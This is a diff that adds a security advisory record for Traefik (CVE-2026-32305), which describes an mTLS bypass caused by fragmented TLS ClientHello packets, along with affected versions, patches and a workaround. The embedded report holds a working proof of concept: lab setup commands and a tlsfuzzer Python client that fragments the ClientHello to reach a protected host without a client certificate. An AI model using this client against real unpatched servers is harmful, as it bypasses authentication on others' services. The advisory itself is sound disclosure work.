@@ -1,0 +1,133 @@
+{
+  "id": "GHSA-wvvq-wgcr-9q48",
+  "modified": "2026-03-23T18:56:07.286130Z",
+  "published": "2026-03-20T15:43:01Z",
+  "aliases": [
+    "CVE-2026-32305",
+    "GO-2026-4793"
+  ],
+  "summary": "Traefik has a Potential mTLS Bypass via Fragmented TLS ClientHello Causing Pre-SNI Sniff Fallback to Default Non-mTLS TLS Config",
+  "details": "## Summary\n\nThere is a potential vulnerability in Traefik's TLS SNI pre-sniffing logic related to fragmented ClientHello packets.\n\nWhen a TLS ClientHello is fragmented across multiple records, Traefik's SNI extraction may fail with an EOF and return an empty SNI. The TCP router then falls back to the default TLS configuration, which does not require client certificates by default. This allows an attacker to bypass route-level mTLS enforcement and access services that should require mutual TLS authentication.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.41\n- https://github.com/traefik/traefik/releases/tag/v3.6.11\n- https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n\u003cdetails\u003e\n\u003csummary\u003eOriginal Description\u003c/summary\u003e\n\n### Summary\nI found a behavior in Traefik's latest version where fragmented ClientHello packets can cause pre-sniff SNI extraction to not find the sni (EOF during sniff), which makes the TCP router fall back to default routing TLS config.\n\nIf the default TLS config does not require client certificates (which is NoClientCert by default), the handshake succeeds without client auth, and the request is later routed to the HTTP Host which should be the protected with client certificate authentication (RequireAndVerifyClientCert tls config).\n\n### Details\nThe vulnerability is caused by a mismatch between where Traefik decides the TLS policy per host and where Go TLS can finally parse the full ClientHello.\n\n1. In router.go, ServeTCP function calls clientHelloInfo.\n2. clientHelloInfo peeks only one TLS record length (recLen) and then peeks exactly 5 + recLen bytes.\nIt runs a temporary TLS parse on those bytes to extract the SNI.\nIf ClientHello is fragmented, pre-sniff may return empty SNI (With fragmentation, first record can be incomplete for full ClientHello parsing).\n4. clientHelloInfo still returns isTLS=true and empty SNI (it thinks there is no sni so it applies the default tls config (Which is by default NoClientCert which is permissive)\n5. Real Go TLS handshake succeeds later without requiring the client cert.\n6. Request is routed to the host that should have been protected.\n\nConditions required for impact:\n- Route-level TLS options enforce mTLS for a host.\n- Default TLS config is weaker (noClientCert, which is the default default).\n- Pre-sniff fails to extract SNI (due to fragmented ClientHello).\n\nA workaround for this is to set the default tls config to RequireAndVerifyClientCert (but then you need to explicitly define for each permissive host the NoClientCert TLS config).\n\nA suggestion to fix is to parse the complete ClientHello before tls config decision (handle multi-record fragmentation).\n\n### PoC\n```python\n# prerequisites (ubuntu/debian, in rhel/fedora you need to run only the install command (dnf) but with \"docker\" instead of docker.io and podman will emulate it)\nsudo apt update\nsudo apt install -y docker.io openssl git python3 python3-venv\nsudo usermod -aG docker \"$USER\"\n# in debian/ubuntu run newgrp docker to apply the new group to the user\n\nmkdir -p /tmp/traefik-frag-poc/{certs,config/dynamic}\ncd /tmp/traefik-frag-poc\n\n# CA\nopenssl genrsa -out certs/ca.key 4096\nopenssl req -x509 -new -nodes -key certs/ca.key -sha256 -days 3650 \\\n  -subj \"/CN=PoC-CA\" -out certs/ca.crt\n\n# Server cert (whoami.home.arpa)\ncat \u003e certs/server.cnf \u003c\u003c'EOF_SERVER_CNF'\n[req]\ndistinguished_name = dn\nreq_extensions = v3_req\nprompt = no\n\n[dn]\nCN = whoami.home.arpa\n\n[v3_req]\nsubjectAltName = @alt_names\n\n[alt_names]\nDNS.1 = whoami.home.arpa\nEOF_SERVER_CNF\n\nopenssl genrsa -out certs/traefik.key 2048\nopenssl req -new -key certs/traefik.key -out certs/traefik.csr -config certs/server.cnf\nopenssl x509 -req -in certs/traefik.csr -CA certs/ca.crt -CAkey certs/ca.key -CAcreateserial \\\n  -out certs/traefik.crt -days 365 -sha256 -extensions v3_req -extfile certs/server.cnf\n\n# Client cert (valid client)\nopenssl genrsa -out certs/client.key 2048\nopenssl req -new -key certs/client.key -subj \"/CN=client1\" -out certs/client.csr\nopenssl x509 -req -in certs/client.csr -CA certs/ca.crt -CAkey certs/ca.key -CAcreateserial \\\n  -out certs/client.crt -days 365 -sha256\n\ncat \u003e config/traefik.yml \u003c\u003c'EOF_TRAEFIK_CFG'\nentryPoints:\n  websecure:\n    address: \":8443\"\n\nproviders:\n  file:\n    directory: /etc/traefik/dynamic\n    watch: true\n\nlog:\n  level: DEBUG\nEOF_TRAEFIK_CFG\n\ncat \u003e config/dynamic/dynamic.yml \u003c\u003c'EOF_DYNAMIC_CFG'\nhttp:\n  routers:\n    whoami:\n      rule: \"Host(`whoami.home.arpa`)\"\n      entryPoints:\n        - websecure\n      service: whoami\n      tls:\n        options: mtls\n\n  services:\n    whoami:\n      loadBalancer:\n        servers:\n          - url: \"http://whoami:80\"\n\ntls:\n  certificates:\n    - certFile: /certs/traefik.crt\n      keyFile: /certs/traefik.key\n\n  options:\n    mtls:\n      clientAuth:\n        caFiles:\n          - /certs/ca.crt\n        clientAuthType: RequireAndVerifyClientCert\nEOF_DYNAMIC_CFG\n\ndocker network create traefik-poc\n\n\n# run a whoami microservice for the bypass demonstration\ndocker run -d \\\n  --name whoami \\\n  --network traefik-poc \\\n  --restart unless-stopped \\\n  traefik/whoami:v1.11.0\n\ndocker run -d \\\n  --name traefik \\\n  --network traefik-poc \\\n  -p 8443:8443 \\\n  --restart unless-stopped \\\n  -v \"$PWD/config/traefik.yml:/etc/traefik/traefik.yml:ro,Z\" \\\n  -v \"$PWD/config/dynamic:/etc/traefik/dynamic:ro,Z\" \\\n  -v \"$PWD/certs:/certs:ro,Z\" \\\n  traefik:3.6.10 \\\n  --configFile=/etc/traefik/traefik.yml\n\n# watch traefik logs to ensure everything was deployed correctly\ndocker logs traefik\n\n# tlsfuzzer setup + frag client script\n\nmkdir -p /tmp/testtlsfuzz\ncd /tmp/testtlsfuzz\ngit clone https://github.com/tlsfuzzer/tlsfuzzer.git\ncd tlsfuzzer\n\npython3 -m venv .venv\nsource .venv/bin/activate\npip install -r requirements.txt\n\ncat \u003e frag_clienthello.py \u003c\u003c'EOF_FRAG_SCRIPT'\nimport argparse\nimport sys\nimport os\n\nfrom tlsfuzzer.runner import Runner\nfrom tlsfuzzer.messages import (\n    Connect,\n    SetMaxRecordSize,\n    ClientHelloGenerator,\n    CertificateGenerator,\n    CertificateVerifyGenerator,\n    ClientKeyExchangeGenerator,\n    ChangeCipherSpecGenerator,\n    FinishedGenerator,\n    ApplicationDataGenerator,\n    AlertGenerator,\n)\nfrom tlsfuzzer.expect import (\n    ExpectServerHello,\n    ExpectCertificate,\n    ExpectServerKeyExchange,\n    ExpectCertificateRequest,\n    ExpectServerHelloDone,\n    ExpectChangeCipherSpec,\n    ExpectFinished,\n    ExpectApplicationData,\n    ExpectAlert,\n    ExpectClose,\n)\nfrom tlsfuzzer.helpers import SIG_ALL\nfrom tlslite.constants import (\n    CipherSuite,\n    ExtensionType,\n    AlertLevel,\n    AlertDescription,\n    GroupName,\n)\nfrom tlslite.extensions import (\n    SNIExtension,\n    TLSExtension,\n    SupportedGroupsExtension,\n    SignatureAlgorithmsExtension,\n    SignatureAlgorithmsCertExtension,\n)\nfrom tlslite.utils.keyfactory import parsePEMKey\nfrom tlslite.x509 import X509\nfrom tlslite.x509certchain import X509CertChain\n\n\nclass PrettyExpectApplicationData(ExpectApplicationData):\n    def process(self, state, msg):\n        super().process(state, msg)\n        text = msg.write().decode(\"utf-8\", errors=\"replace\")\n        head, _, body = text.partition(\"\\r\\n\\r\\n\")\n        print(\"\\n=== HTTP RESPONSE ===\")\n        print(head)\n        print()\n        print(body)\n        print(\"=== END HTTP RESPONSE ===\\n\")\n\n\ndef load_client_cert_and_key(cert_path, key_path):\n    cert = None\n    key = None\n\n    if cert_path:\n        text_cert = open(cert_path, \"rb\").read()\n        if sys.version_info[0] \u003e= 3:\n            text_cert = str(text_cert, \"utf-8\")\n        cert = X509()\n        cert.parse(text_cert)\n\n    if key_path:\n        text_key = open(key_path, \"rb\").read()\n        if sys.version_info[0] \u003e= 3:\n            text_key = str(text_key, \"utf-8\")\n        key = parsePEMKey(text_key, private=True)\n\n    return cert, key\n\n\ndef main():\n    p = argparse.ArgumentParser()\n    p.add_argument(\"--connect-host\", default=\"127.0.0.1\")\n    p.add_argument(\"--port\", type=int, default=8443)\n    p.add_argument(\"--sni\", default=\"whoami.home.arpa\")\n    p.add_argument(\"--record-size\", type=int, default=512)\n    p.add_argument(\"--padding-len\", type=int, default=1200)\n    p.add_argument(\"--expect-cert-request\", action=\"store_true\")\n    p.add_argument(\"--client-cert-pem\", default=\"\")\n    p.add_argument(\"--client-key-pem\", default=\"\")\n    args = p.parse_args()\n\n    cert, key = load_client_cert_and_key(args.client_cert_pem, args.client_key_pem)\n\n    print(f\"[DBG] cert_arg={args.client_cert_pem!r} key_arg={args.client_key_pem!r}\")\n    for p in [args.client_cert_pem, args.client_key_pem]:\n        if p:\n            print(f\"[DBG] file={p} exists={os.path.exists(p)} size={os.path.getsize(p) if os.path.exists(p) else -1}\")\n\n    print(f\"[DBG] cert_loaded={cert is not None} key_loaded={key is not None}\")\n    print(f\"[DBG] bool(cert)={bool(cert) if cert is not None else None} bool(key)={bool(key) if key is not None else None}\")\n\n\n    if (args.client_cert_pem or args.client_key_pem) and not (cert and key):\n        raise ValueError(\"Provide both --client-cert-pem and --client-key-pem\")\n\n    conv = Connect(args.connect_host, args.port)\n    node = conv\n    node = node.add_child(SetMaxRecordSize(args.record_size))\n\n    ext = {\n        ExtensionType.server_name: SNIExtension().create(bytearray(args.sni, \"ascii\")),\n        ExtensionType.supported_groups: SupportedGroupsExtension().create(\n            [GroupName.secp256r1, GroupName.ffdhe2048]\n        ),\n        ExtensionType.signature_algorithms: SignatureAlgorithmsExtension().create(SIG_ALL),\n        ExtensionType.signature_algorithms_cert: SignatureAlgorithmsCertExtension().create(SIG_ALL),\n        21: TLSExtension().create(21, bytearray(args.padding_len)),\n    }\n\n    ciphers = [\n        CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,\n        CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,\n        CipherSuite.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,\n        CipherSuite.TLS_EMPTY_RENEGOTIATION_INFO_SCSV,\n    ]\n\n    node = node.add_child(ClientHelloGenerator(ciphers, extensions=ext))\n    node = node.add_child(ExpectServerHello())\n    node = node.add_child(ExpectCertificate())\n    node = node.add_child(ExpectServerKeyExchange())\n\n    if args.expect_cert_request:\n        node = node.add_child(ExpectCertificateRequest())\n\n    node = node.add_child(ExpectServerHelloDone())\n\n    if args.expect_cert_request and cert and key:\n        node = node.add_child(CertificateGenerator(X509CertChain([cert])))\n        node = node.add_child(ClientKeyExchangeGenerator())\n        node = node.add_child(CertificateVerifyGenerator(key))\n        node = node.add_child(ChangeCipherSpecGenerator())\n        node = node.add_child(FinishedGenerator())\n        node = node.add_child(ExpectChangeCipherSpec())\n        node = node.add_child(ExpectFinished())\n        req = bytearray(\n            f\"GET / HTTP/1.1\\r\\nHost: {args.sni}\\r\\nConnection: close\\r\\n\\r\\n\".encode(\"ascii\")\n        )\n        node = node.add_child(ApplicationDataGenerator(req))\n        node = node.add_child(PrettyExpectApplicationData(output=sys.stdout))\n        node = node.add_child(AlertGenerator(AlertLevel.warning, AlertDescription.close_notify))\n        node = node.add_child(ExpectAlert())\n        node.next_sibling = ExpectClose()\n\n    elif args.expect_cert_request and not (cert and key):\n        node = node.add_child(CertificateGenerator())\n        node = node.add_child(ClientKeyExchangeGenerator())\n        node = node.add_child(ChangeCipherSpecGenerator())\n        node = node.add_child(FinishedGenerator())\n        node = node.add_child(ExpectChangeCipherSpec())\n        node = node.add_child(ExpectFinished())\n\n    else:\n        node = node.add_child(ClientKeyExchangeGenerator())\n        node = node.add_child(ChangeCipherSpecGenerator())\n        node = node.add_child(FinishedGenerator())\n        node = node.add_child(ExpectChangeCipherSpec())\n        node = node.add_child(ExpectFinished())\n        req = bytearray(\n            f\"GET / HTTP/1.1\\r\\nHost: {args.sni}\\r\\nConnection: close\\r\\n\\r\\n\".encode(\"ascii\")\n        )\n        node = node.add_child(ApplicationDataGenerator(req))\n        node = node.add_child(PrettyExpectApplicationData(output=sys.stdout))\n        node = node.add_child(AlertGenerator(AlertLevel.warning, AlertDescription.close_notify))\n        node = node.add_child(ExpectAlert())\n        node.next_sibling = ExpectClose()\n\n    try:\n        Runner(conv).run()\n        print(\"[OK] conversation completed\")\n    except AssertionError as e:\n        print(f\"[TLS RAW ERROR] {e}\")\n        marker = \"Unexpected message from peer: \"\n        s = str(e)\n        if marker in s:\n            print(f\"[TLS PEER MESSAGE] {s.split(marker, 1)[1].strip()}\")\n        raise\n\n\nif __name__ == \"__main__\":\n    main()\nEOF_FRAG_SCRIPT\n\nchmod +x frag_clienthello.py\ncd /tmp/testtlsfuzz/tlsfuzzer\nsource .venv/bin/activate\n\n# case 1: non fragmented, no client cert (strict mTLS path, should fail. traefik logs should inform that client didn't provide a certificate)\npython frag_clienthello.py \\\n  --connect-host 127.0.0.1 \\\n  --port 8443 \\\n  --sni whoami.home.arpa \\\n  --record-size 16384 \\\n  --expect-cert-request\n\n# case 1b with openssl instead of my script\nprintf 'GET / HTTP/1.1\\r\\nHost: whoami.home.arpa\\r\\nConnection: close\\r\\n\\r\\n' | \\\nopenssl s_client \\\n  -connect 127.0.0.1:8443 \\\n  -servername whoami.home.arpa \\\n  -tls1_2 \\\n  -CAfile /tmp/traefik-frag-poc/certs/ca.crt \\\n  -state -msg -tlsextdebug -verify_return_error\n\n\n# case 2: non fragmented, with valid client cert (should succeed) \npython frag_clienthello.py \\\n  --connect-host 127.0.0.1 \\\n  --port 8443 \\\n  --sni whoami.home.arpa \\\n  --record-size 16384 \\\n  --expect-cert-request \\\n  --client-cert-pem /tmp/traefik-frag-poc/certs/client.crt \\\n  --client-key-pem /tmp/traefik-frag-poc/certs/client.key\n\n# case 2b with openssl instead of my script\nprintf 'GET / HTTP/1.1\\r\\nHost: whoami.home.arpa\\r\\nConnection: close\\r\\n\\r\\n' | \\\nopenssl s_client -connect 127.0.0.1:8443 -servername whoami.home.arpa -tls1_2 \\\n  -cert /tmp/traefik-frag-poc/certs/client.crt \\\n  -key /tmp/traefik-frag-poc/certs/client.key \\\n  -CAfile /tmp/traefik-frag-poc/certs/ca.crt -quiet\n\n# case 3 fragmented ClientHello, no client cert (bypass behavior test)\npython frag_clienthello.py \\\n  --connect-host 127.0.0.1 \\\n  --port 8443 \\\n  --sni whoami.home.arpa \\\n  --record-size 500\n# in the record-size you can play with it as long as the client hello sni sniff function returns an EOF\n```\n\n### Impact\nAn attacker can bypass route-level mTLS enforcement by fragmenting ClientHello so Traefik pre-sniff fails (EOF) and falls back to default permissive TLS config.\n\n\u003c/details\u003e\n\n--",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.7.0-ea.1"
+            },
+            {
+              "fixed": "3.7.0-ea.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wvvq-wgcr-9q48/GHSA-wvvq-wgcr-9q48.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.6.11"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.6.10",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wvvq-wgcr-9q48/GHSA-wvvq-wgcr-9q48.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v2",
+        "purl": "pkg:golang/github.com/traefik/traefik/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.41"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.11.40",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wvvq-wgcr-9q48/GHSA-wvvq-wgcr-9q48.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik",
+        "purl": "pkg:golang/github.com/traefik/traefik"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.7.34"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wvvq-wgcr-9q48/GHSA-wvvq-wgcr-9q48.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/security/advisories/GHSA-wvvq-wgcr-9q48"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-32305"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/traefik/traefik"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v2.11.41"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.6.11"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2"
+    }
+  ]
+}
